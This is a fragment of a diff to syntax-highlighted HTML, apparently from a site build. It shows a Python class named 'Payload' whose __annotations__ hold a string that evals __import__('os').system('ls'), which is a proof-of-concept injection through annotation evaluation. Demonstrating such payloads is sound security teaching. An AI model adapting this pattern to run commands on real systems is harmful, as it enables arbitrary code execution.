 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Payload</span>(object):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self):
 </span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>__annotations__ <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;x&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;eval(&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)&#34;&#34;&#34;</span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
